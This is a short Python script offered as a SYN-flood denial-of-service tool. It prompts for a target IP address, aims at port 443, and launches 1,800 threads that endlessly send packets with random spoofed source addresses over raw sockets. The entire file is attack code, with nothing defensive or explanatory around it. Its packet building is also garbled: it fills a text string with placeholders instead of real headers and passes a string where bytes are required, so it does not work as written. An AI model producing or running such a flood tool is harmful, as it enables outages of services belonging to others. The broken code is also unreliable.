import socket
import threading
import random

# Target Information
target_ip = input("Enter Ip Address")
target_port = 443

# Function to create a SYN packet
def create_syn_packet():
    # Create raw socket (requires root privileges)
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

    # Random source IP address and port
    source_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    source_port = random.randint(1024, 65535)

    # SYN packet construction (using TCP flags)
    syn_packet = (
        # IP Header
        f"{source_ip}\x00\x00\x00\x00"  # Placeholder for IP header
        # TCP Header
        f"{source_port}\x00\x00"        # Source port (random)
        f"{target_ip}\x00\x00\x00\x00"  # Placeholder for TCP header
        "\x02"  # SYN flag set
    )
    return syn_packet

# Function to send SYN packets
def syn_flood():
    while True:
        try:
            packet = create_syn_packet()
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.sendto(packet, (target_ip, target_port))
        except Exception as e:
            print(f"Error: {e}")

# Run attack with multiple threads
def run_attack():
    for _ in range(1800):  # Increase number of threads for more intensity
        thread = threading.Thread(target=syn_flood)
        thread.start()

run_attack()
